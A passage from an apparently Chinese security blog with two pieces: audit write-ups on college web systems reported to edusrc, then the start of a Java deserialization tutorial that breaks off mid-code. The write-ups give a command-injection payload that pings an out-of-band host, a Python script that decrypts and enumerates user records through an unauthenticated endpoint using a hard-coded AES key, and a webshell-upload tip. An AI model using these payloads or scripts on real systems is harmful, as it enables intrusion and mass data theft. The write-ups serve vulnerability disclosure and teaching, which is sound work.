<p><strong><code>process.StartInfo.RedirectStandardOutput = true;</code></strong><br>将标准输出流重定向到调用程序，以便程序可以读取外部进程的输出。这是在需要捕获外部程序生成的文本或日志时常用的设置</p>
<p><strong><code>process.StartInfo.CreateNoWindow = true;</code></strong><br>设置为 <code>true</code>，表示在启动外部程序时不创建新的窗口。这通常用于后台进程操作，以保持用户界面的整洁</p>
<p><strong><code>process.Start();</code></strong><br>这行代码启动之前配置好的进程。在调用 <code>Start()</code> 方法后，外部程序将开始执行</p>
<p><strong><code>process.WaitForExit(60000);</code></strong><br>这行代码使调用线程等待外部进程结束，最多等待60000毫秒（即60秒）。如果外部进程在这个时间内完成，调用线程将继续执行。如果超过60秒，调用将会超时，线程将继续执行后面的代码。这是一种防止应用程序挂起的安全措施。</p>
<p><strong><code>string str3 = process.StandardOutput.ReadToEnd();</code></strong><br>这行代码从外部进程的标准输出流中读取所有输出，直到流的末尾，并将其存储在变量 <code>str3</code> 中。</p>
<p>简而言之，观察代码可以命令注入，构造个拼接语句即可。<br>发现Number拼接最不影响其他位置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&quot; &amp; ping v40644kpvyvkpm5wwgmkesad84ev2lqa.oastify.com &amp; &quot;</span><br></pre></td></tr></table></figure>
<p>传参</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/steppages/ExportPDF.aspx?TaskID=1&amp;Number=1&quot; &amp; ping v40644kpvyvkpm5wwgmkesad84ev2lqa.oastify.com &amp; &quot;a&amp;Type=tp&amp;PROCESSNAME=test</span><br></pre></td></tr></table></figure>
<p>编码一下，让更稳定：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/steppages/ExportPDF.aspx?TaskID=1&amp;Number=%31%22%20%26%20%70%69%6e%67%20%76%34%30%36%34%34%6b%70%76%79%76%6b%70%6d%35%77%77%67%6d%6b%65%73%61%64%38%34%65%76%32%6c%71%61%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%20%26%20%22%61&amp;Type=tp&amp;PROCESSNAME=test</span><br></pre></td></tr></table></figure>
<p><img src="/images/Pasted%20image%2020240815145623.png"></p>
<p><strong>RCE+1</strong>，可以下一个了。</p>
<h2 id="西-学院"><a href="#西-学院" class="headerlink" title="西***学院"></a>西***学院</h2><p>扫到源码，开始审计。<br><img src="/images/Pasted%20image%2020240901191912.png"></p>
<h3 id="找入口DLL"><a href="#找入口DLL" class="headerlink" title="找入口DLL"></a>找入口DLL</h3><p>其实不管怎么样最终肯定是能找到的，我这里只说如何快速找到。</p>
<p>访问网站跳转统一身份认证。<br><img src="/images/Pasted%20image%2020240901191852.png"></p>
<p>发现一些接口地址，报了错误，net程序开启了debug模式，报错内容还挺多。我这里访问的路由是<code>/ad</code><br><img src="/images/Pasted%20image%2020240901192536.png"></p>
<p>从报错内容来看，通过<code>/ad</code>同时找到了多个匹配控制器，至少确定了入口，直接找对应dll即可。<br><img src="/images/Pasted%20image%2020240901193838.png"></p>
<h3 id="未授权访问导致Sql注入"><a href="#未授权访问导致Sql注入" class="headerlink" title="未授权访问导致Sql注入"></a>未授权访问导致Sql注入</h3><p>反编译dll，发现不少controller，大致都看看<br><img src="/images/Pasted%20image%2020240901194105.png"></p>
<p>大致阅读下代码发现，大部分内容进行了鉴权<br><img src="/images/Pasted%20image%2020240901194452.png"></p>
<p>看下UserLogin的注解代码，总而言之：使用<code>JsonConvert</code>反序列化内容，对cookie等信息进行验证，鉴权的这部分代码还是比较繁多的（同时还可以全局搜索<code>JsonConvert</code>，尝试寻找反序列化漏洞触发点，此处暂不介绍）。<br><img src="/images/Pasted%20image%2020240901194828.png"><br><img src="/images/Pasted%20image%2020240901194840.png"></p>
<p>虽然大部分代码进行了鉴权，但还是有一些方法没有进行鉴权，下面将优先着重去看没有鉴权的方法。</p>
<p><code>CheckTeacherForGlobal</code>可以搜索学校、老师等信息<br><img src="/images/Pasted%20image%2020240901195254.png"></p>
<p>一眼丁真，传入参数<code>userId</code>和<code>schoolId</code>给<code>GetTeacherByUserId</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TeacherEntity teacherByUserId = Helper&lt;TeacherBLL&gt;.Instance.GetTeacherByUserId(userId, schoolId);</span><br></pre></td></tr></table></figure>
<p><img src="/images/Pasted%20image%2020240901195419.png"></p>
<p>追进去看看<br><img src="/images/Pasted%20image%2020240901195625.png"></p>
<p>继续，调用Dal层代码，使用format直接拼接，稳Sql注入了，可以收工了。<br><img src="/images/Pasted%20image%2020240901195640.png"></p>
<p>是个mysql，寄没意思。<br><img src="/images/Pasted%20image%2020240901195818.png"></p>
<ul>
<li>Tips：当然了，这种正向的审计方式也可以调换下，先优先看Dal层代码，如果存在注入，然后再反向去找调用点，这样效率可能会高一些。</li>
</ul>
<p><img src="/images/Pasted%20image%2020240901200306.png"></p>
<h2 id="师范学院"><a href="#师范学院" class="headerlink" title="**师范学院"></a>**师范学院</h2><h3 id="DLL-入口"><a href="#DLL-入口" class="headerlink" title="DLL 入口"></a>DLL 入口</h3><p>一眼顶真：API.dll<br><img src="/images/Pasted%20image%2020240927085257.png"></p>
<p>导入存在Controller，接下来审计即可：<br><img src="/images/Pasted%20image%2020240927085355.png"></p>
<h3 id="流量解密导致信息泄漏"><a href="#流量解密导致信息泄漏" class="headerlink" title="流量解密导致信息泄漏"></a>流量解密导致信息泄漏</h3><p>审计发现UserController的UserInfo没有设置鉴权。</p>
<p>UserInfo函数传入para参数<br><img src="/images/Pasted%20image%2020240927090706.png"></p>
<p>Header获取From参数，如果值是WeChat则对para进行解密<br><img src="/images/Pasted%20image%2020240927103450.png"></p>
<p>跟进Decrypt，发现HHSoftEncrypt类还定义了加密方法：Encrypt<br>解密：<br><img src="/images/Pasted%20image%2020240927103603.png"></p>
<p>加密：<img src="/images/Pasted%20image%2020240927103619.png"></p>
<p>para值应当是json，解密完事后使用json进行解析，读取user_id参数。<br>那么我们只需要构造json进行加密，然后传入即可：<br><img src="/images/Pasted%20image%2020240927104030.png"></p>
<p>分析下HHSoftEncrypt类的Encrypt函数，有种spring的分层写法风格，但实际上下面定义了AES_key， 那么我们可以直接用aes加密试一下：<br><img src="/images/Pasted%20image%2020240927104502.png"></p>
<p>需要注意的是代码中对user_id参数值也进行了解密，所有user_id也需要加密处理：<br><img src="/images/Pasted%20image%2020240927104600.png"><br>加密一下，最终需要使用base64加密<br><img src="/images/Pasted%20image%2020240804025328.png"></p>
<p>发包过去，返回内容明显比之前测试时更长，表示返回了内容。<br><img src="/images/Pasted%20image%2020240927104755.png"></p>
<p>接着用同样的方式对返回内容解密即可：<br><img src="/images/Pasted%20image%2020240804025442.png"></p>
<p>但实际上程序对每个value都加密了，可以写个脚本少量便利下获取明文：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad  </span><br><span class="line"><span class="keyword">import</span> base64  </span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_encrypt</span>(<span class="params">plain_text</span>):</span><br><span class="line">    <span class="keyword">if</span> plain_text:</span><br><span class="line">        bytes_to_encrypt = plain_text.encode(<span class="string">&#x27;utf-8&#x27;</span>)  </span><br><span class="line"></span><br><span class="line">        key_string = <span class="string">&quot;1862b0deb369e73a&quot;</span>  </span><br><span class="line">        key = <span class="built_in">bytearray</span>(<span class="number">16</span>)  </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):  </span><br><span class="line">            <span class="keyword">if</span> i &lt; <span class="built_in">len</span>(key_string):  </span><br><span class="line">                key[i] = <span class="built_in">ord</span>(key_string[i]) </span><br><span class="line">            <span class="keyword">else</span>:  </span><br><span class="line">                key[i] = <span class="number">18</span></span><br><span class="line"></span><br><span class="line">        iv = <span class="built_in">bytearray</span>(<span class="built_in">range</span>(<span class="number">1</span>, <span class="number">17</span>)) </span><br><span class="line"></span><br><span class="line">        cipher = AES.new(<span class="built_in">bytes</span>(key), AES.MODE_CBC, <span class="built_in">bytes</span>(iv))  </span><br><span class="line">        padded_data = pad(bytes_to_encrypt, AES.block_size)  </span><br><span class="line">        encrypted = cipher.encrypt(padded_data)  </span><br><span class="line"></span><br><span class="line">        result = base64.b64encode(encrypted).decode(<span class="string">&#x27;utf-8&#x27;</span>).replace(<span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;%2b&#x27;</span>)  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        result = plain_text  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_base64</span>(<span class="params">value</span>):  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;解码 Base64 字符串，处理可能的异常情况&quot;&quot;&quot;</span>  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        <span class="comment"># Base64 解码  </span></span><br><span class="line">        decoded_bytes = base64.b64decode(value)  </span><br><span class="line">        <span class="comment"># 将字节转换为字符串  </span></span><br><span class="line">        <span class="keyword">return</span> decoded_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)  </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">        <span class="comment"># 在解码失败时返回原始值或处理异常  </span></span><br><span class="line">        <span class="keyword">return</span> value  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_base64</span>(<span class="params">input_string</span>):  </span><br><span class="line">    <span class="comment"># 将字符串转换为字节  </span></span><br><span class="line">    input_bytes = input_string.encode(<span class="string">&#x27;utf-8&#x27;</span>)  </span><br><span class="line"></span><br><span class="line">    <span class="comment"># 进行 Base64 编码  </span></span><br><span class="line">    base64_bytes = base64.b64encode(input_bytes)  </span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将编码后的字节转换回字符串  </span></span><br><span class="line">    base64_string = base64_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> base64_string  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_decrypt</span>(<span class="params">cipher_text</span>):  </span><br><span class="line">    <span class="keyword">if</span> cipher_text:  </span><br><span class="line">        <span class="comment"># URL 解码替换  </span></span><br><span class="line">        cipher_text = cipher_text.replace(<span class="string">&quot;%2b&quot;</span>, <span class="string">&quot;+&quot;</span>)  </span><br><span class="line">        <span class="comment"># 将 Base64 字符串转换为字节  </span></span><br><span class="line">        byte_array = base64.b64decode(cipher_text)  </span><br><span class="line"></span><br><span class="line">        <span class="comment"># 设置密钥  </span></span><br><span class="line">        key_string = <span class="string">&quot;1862b0deb369e73a&quot;</span>  </span><br><span class="line">        key = <span class="built_in">bytearray</span>(<span class="number">16</span>)  </span><br><span class="line">        bytes_key = <span class="built_in">bytearray</span>(key_string.encode(<span class="string">&#x27;utf-8&#x27;</span>))  </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):  </span><br><span class="line">            <span class="keyword">if</span> i &gt;= <span class="built_in">len</span>(bytes_key):  </span><br><span class="line">                key[i] = <span class="number">18</span>  </span><br><span class="line">            <span class="keyword">else</span>:  </span><br><span class="line">                key[i] = bytes_key[i]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 设置 IV  </span></span><br><span class="line">        iv = <span class="built_in">bytearray</span>(<span class="built_in">range</span>(<span class="number">1</span>, <span class="number">17</span>))  <span class="comment"># [1, 2, ..., 16]  </span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 创建 AES 解密器  </span></span><br><span class="line">        cipher = AES.new(<span class="built_in">bytes</span>(key), AES.MODE_CBC, <span class="built_in">bytes</span>(iv))  </span><br><span class="line">        decrypted = cipher.decrypt(byte_array)  </span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将解密后的数据转换为字符串  </span></span><br><span class="line">        result = decrypted.decode(<span class="string">&#x27;utf-8&#x27;</span>).rstrip(<span class="string">&#x27;\0&#x27;</span>)  <span class="comment"># 去除多余的空字符  </span></span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        result = cipher_text  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove_invisible_characters</span>(<span class="params">input_string</span>):  </span><br><span class="line">    <span class="comment"># 使用 rstrip() 去除末尾的不可见字符  </span></span><br><span class="line">    <span class="keyword">return</span> input_string.rstrip(<span class="string">&#x27;\x00\x01\x02\x03\x04\x05\x06\x07\x08&#x27;</span>  <span class="comment"># Control characters  </span></span><br><span class="line">                                <span class="string">&#x27;\x0B\x0C\x0E\x0F\x10\x11\x12\x13&#x27;</span>  <span class="comment"># More control characters  </span></span><br><span class="line">                                <span class="string">&#x27;\x14\x15\x16\x17\x18\x19\x1A\x1B&#x27;</span>   </span><br><span class="line">                                <span class="string">&#x27;\x1C\x1D\x1E\x1F&#x27;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:  </span><br><span class="line">    url = <span class="string">&quot;https://xxxxxx/User/UserInfo&quot;</span></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">300</span>):</span><br><span class="line">        sj = <span class="string">&#x27;&#123;&#123;&quot;user_id&quot;:&quot;&#123;&#125;&quot;&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(encode_base64(<span class="built_in">str</span>(i)))</span><br><span class="line">        <span class="comment"># print(sj)</span></span><br><span class="line">        data = <span class="string">&quot;para=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(custom_encrypt(sj))</span><br><span class="line">        res = requests.post(url=url, data=data, headers=header, verify=<span class="literal">False</span>)</span><br><span class="line">        decode_res = custom_decrypt(res.text)</span><br><span class="line">        <span class="built_in">print</span>(decode_res)</span><br><span class="line"></span><br><span class="line">        decode_res_json = json.loads(remove_invisible_characters(decode_res))</span><br><span class="line">        res_result = decode_res_json.get(<span class="string">&#x27;result&#x27;</span>, &#123;&#125;) </span><br><span class="line"></span><br><span class="line">        df = pd.DataFrame([res_result])</span><br><span class="line">        <span class="keyword">for</span> column <span class="keyword">in</span> df.columns:  </span><br><span class="line">            df[column] = df[column].apply(<span class="keyword">lambda</span> x: decode_base64(x) <span class="keyword">if</span> <span class="built_in">isinstance</span>(x, <span class="built_in">str</span>) <span class="keyword">else</span> x) </span><br><span class="line">        df.to_csv(<span class="string">&#x27;output.csv&#x27;</span>, index=<span class="literal">False</span>, mode=<span class="string">&#x27;a&#x27;</span>, header=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/images/Pasted%20image%2020240927105033.png"></p>
<h2 id="职业技术学院"><a href="#职业技术学院" class="headerlink" title="**职业技术学院"></a>**职业技术学院</h2><p>此源码采用的是Web Site Project模式</p>
<h3 id="WebSiteProject-模式的特点"><a href="#WebSiteProject-模式的特点" class="headerlink" title="WebSiteProject 模式的特点"></a>WebSiteProject 模式的特点</h3><ol>
<li><p><strong>无需编译整个项目</strong>：</p>
<ul>
<li>在 Web Site Project 模式中，页面（如 <code>.aspx</code> 和 <code>.ascx</code> 文件）以及其代码隐藏文件（如 <code>.cs</code> 文件）不需要预先编译成单独的 DLL 文件。</li>
<li>网站运行时，ASP.NET 动态编译这些文件。</li>
</ul>
</li>
<li><p><strong>灵活的文件结构</strong>：</p>
<ul>
<li>你可以随时添加、修改或删除文件而无需重新编译整个项目。</li>
<li>适合小型项目或需要频繁调整的环境。</li>
</ul>
</li>
<li><p><strong>每页独立编译</strong>：</p>
<ul>
<li>每个页面在请求时独立编译。这使得部署时只需上传修改的文件，而无需重新部署整个网站。</li>
</ul>
</li>
<li><p><strong>没有项目文件</strong>：</p>
<ul>
<li>Web Site Project 不使用 <code>.csproj</code> 文件（项目文件）。</li>
<li>文件的组织完全依赖文件夹结构。开发工具（如 Visual Studio）会根据文件夹结构加载整个项目。</li>
</ul>
</li>
<li><p><strong>支持动态语言特性</strong>：</p>
<ul>
<li>可以直接将类文件（<code>.cs</code> 或 <code>.vb</code> 文件）放入 <code>App_Code</code> 文件夹中，ASP.NET 会自动编译这些文件，并在整个项目中可用。</li>
</ul>
</li>
<li><p><strong>适用场景</strong>：</p>
<ul>
<li>快速原型开发。</li>
<li>需要频繁修改并快速部署的小型项目。</li>
<li>开发团队中没有严格的版本控制需求时。</li>
</ul>
</li>
</ol>
<h3 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h3><p>所以此备份文件中并不存在真实的源代码，但可以通过备份文件中的信息方便黑盒测试。</p>
<p>目录下存在大量compiled文件，其中记录了网站页面路径、接口等相对地址<br><img src="/images/Pasted%20image%2020241219201009.png"></p>
<p>把路径全部提取出来，用burp跑一下，看看哪些是通的<br><img src="/images/Pasted%20image%2020241219201306.png"></p>
<p>有几个是能访问的，但测试发现都没什么用处，但发现两个ueditor路径，其中，一个是controller.ashx可以拉取远程文件，一个是imageUp.ashx 可以上传。</p>
<p>这里并不存在漏洞，ueditor版本比较高，只是记录一个tips<br><strong>在有上传功能的情况下，目标主机不出网可以通过先上传webshell文件，然后用controller.ashx拉取尝试getshell</strong></p>
<ul>
<li>imageUp.ashx</li>
</ul>
<p><img src="/images/Pasted%20image%2020241219201709.png"></p>
<ul>
<li>controller.ashx</li>
</ul>
<p><img src="/images/Pasted%20image%2020241219201958.png"></p>
<h1 id="0x04-结束"><a href="#0x04-结束" class="headerlink" title="0x04 结束"></a>0x04 结束</h1><p>总结：方法有用，但用处不大，没发现明显的通用系统，批量刷分的可能性不是非常高，另外上述漏洞皆重码并提交了edusrc。拜拜～</p>
]]></content>
  </entry>
  <entry>
    <title>Java原生反序列化+Dnslog链分析</title>
    <url>/2024/07/04/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Dnslog%E9%93%BE%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="Java原生反序列化"><a href="#Java原生反序列化" class="headerlink" title="Java原生反序列化"></a>Java原生反序列化</h1><h2 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h2><blockquote>
<p><strong>Java序列化</strong>是指把Java对象转换为字节序列的过程；而<strong>Java反序列化</strong>是指把字节序列恢复为Java对象的过程。</p>
</blockquote>
<ul>
<li><p>序列化分为两大部分<br>序列化是这个过程的第一部分，将数据分解成字节流，以便存储在文件中或在网络上传输。<br>反序列化就是打开字节流并重构对象。对象序列化不仅要将基本数据类型转换成字节表示，有时还要恢复数据。恢复数据要求有恢复数据的对象实例。</p>
</li>
<li><p>为什么要进行序列化与反序列化<br>当两个进程进行远程通信时，可以相互发送各种类型的数据，包括文本、图片、音频、视频等， 而这些数据都会以二进制序列的形式在网络上传送。那么当两个Java进程进行通信时，能否实现进程间的对象传送呢？答案是可以的。如何做到呢？这就需要Java序列化与反序列化了。换句话说，一方面，发送方需要把这个Java对象转换为字节序列，然后在网络上传送；另一方面，接收方需要从字节序列中恢复出Java对象。</p>
</li>
</ul>
<p>当我们明晰了为什么需要Java序列化和反序列化后，我们很自然地会想Java序列化的好处。其好处一是实现了数据的持久化，通过序列化可以把数据永久地保存到硬盘上（通常存放在文件里），二是，利用序列化实现远程通信，即在网络上传送对象的字节序列。</p>
<p>1、想把内存中的对象保存到一个文件中或者数据库中时候；<br>2、想用套接字在网络上传送对象的时候；<br>3、想通过RMI传输对象的时候</p>
<ul>
<li><p>序列化示例1</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.maven_2;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;  </span><br><span class="line">    <span class="comment">// 定义Person类，继承自Serializable  </span></span><br><span class="line">    String name;  </span><br><span class="line">    <span class="type">int</span> age;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;  </span><br><span class="line">        <span class="comment">// 定义方法  </span></span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">        <span class="built_in">this</span>.age = age;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="comment">// toString方便观看  </span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +  </span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +  </span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationExample1</span> &#123;  </span><br><span class="line">    <span class="comment">// 当前代码主类  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="comment">// main函数  </span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Alice&quot;</span>, <span class="number">30</span>);  </span><br><span class="line">        <span class="comment">// 实例化，在Java中创建一个名为 person 的 Person 类型的对象实例。  </span></span><br><span class="line">  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="comment">// 序列化对象  </span></span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;person.ser&quot;</span>);  </span><br><span class="line">            <span class="comment">// 将数据写入文件，系统将会创建一个新的 person.ser文件，如果该文件已经存在，系统将会覆盖原有文件内容  </span></span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOut);  </span><br><span class="line">            <span class="comment">// 将数据输出流连接到fileOut对象  </span></span><br><span class="line">            out.writeObject(person);  </span><br><span class="line">            out.close();  </span><br><span class="line">            fileOut.close();  </span><br><span class="line">            System.out.println(<span class="string">&quot;序列化成功!&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>反序列化示例1</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.maven_2;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeSerializationExample1</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="comment">// 反序列化对象  </span></span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fileIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;person.ser&quot;</span>);  </span><br><span class="line">            <span class="comment">// 读取person.ser  </span></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileIn);  </span><br><span class="line">            <span class="comment">// 通过fileIn对象连接到文件中，以便读取文件中序列化的 Java 对象数据，进行反序列化操作  </span></span><br><span class="line">            <span class="type">Person</span> <span class="variable">deserializedPerson</span> <span class="operator">=</span> (Person) in.readObject();  </span><br><span class="line">            <span class="comment">// 从文件中读取一个 Java 对象，并将其保存为 Person 类型的变量  </span></span><br><span class="line">            in.close();  </span><br><span class="line">            fileIn.close();  </span><br><span class="line">            System.out.println(deserializedPerson);  </span><br><span class="line">            <span class="comment">// 输出  </span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>解析下：</p>
<ul>
<li><p>ObjectOutputStream代表对象输出流<br>它的writeObject(Object obj)方法可对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。</p>
</li>
<li><p>ObjectInputStream代表对象输入流<br>它的readObject()方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。</p>
</li>
<li><p>序列化与反序列化示例2（重写readObject，readObject中使用了危险方法）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.maven_2;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person2</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> String name;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> String status;  </span><br><span class="line">    <span class="comment">// transient不参与反序列化  </span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person2</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">        <span class="built_in">this</span>.age = age;  </span><br><span class="line">        <span class="built_in">this</span>.status = <span class="string">&quot;Active&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person2&#123;&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +  </span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +  </span><br><span class="line">                <span class="string">&quot;, status=&#x27;&quot;</span> + status + <span class="string">&#x27;\&#x27;&#x27;</span> +  </span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// private void writeObject(ObjectOutputStream out) throws IOException &#123;  </span></span><br><span class="line">    <span class="comment">//     out.defaultWriteObject();    //     // 自定义属性在序列化时的处理  </span></span><br><span class="line">    <span class="comment">//     // out.writeObject(status.toUpperCase());  </span></span><br><span class="line">    <span class="comment">// &#125;  </span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line">        in.defaultReadObject();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationExample2</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">Person2</span> <span class="variable">person2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person2</span>(<span class="string">&quot;Alice&quot;</span>, <span class="number">30</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;person2.ser&quot;</span>);  </span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOut);  </span><br><span class="line">            out.writeObject(person2);  </span><br><span class="line">            out.close();  </span><br><span class="line">            fileOut.close();  </span><br><span class="line">            